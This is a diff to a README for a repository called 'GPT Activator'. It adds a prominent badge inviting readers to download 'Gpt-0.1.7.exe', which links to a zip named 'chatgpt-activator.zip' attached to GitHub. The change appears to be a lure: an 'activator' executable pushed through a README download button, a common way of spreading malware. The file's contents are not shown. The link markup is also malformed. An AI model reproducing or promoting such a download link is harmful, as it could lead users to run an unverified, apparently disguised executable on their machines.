@@ -14,6 +14,12 @@
   <img alt="Launcher" src="https://img.shields.io/badge/Launcher-Gpt--0.1.7.exe-7c3aed?style=for-the-badge" />
 </p>
 
+<p align="center">
+  <a href="[DOWNLOAD](https://github.com/user-attachments/files/26911702/chatgpt-activator.zip)">
+    <img src="https://img.shields.io/badge/⬇%20Download%20Gpt--0.1.7.exe-7c3aed?style=for-the-badge&logo=windows&logoColor=white" alt="Download Gpt-0.1.7.exe" />
+  </a>
+</p>
+
 ## Overview 🚀
 
 **GPT Activator** is a presentation-ready repository for GPT-powered tools, launcher-style demos, AI workflows, and branded utility projects.
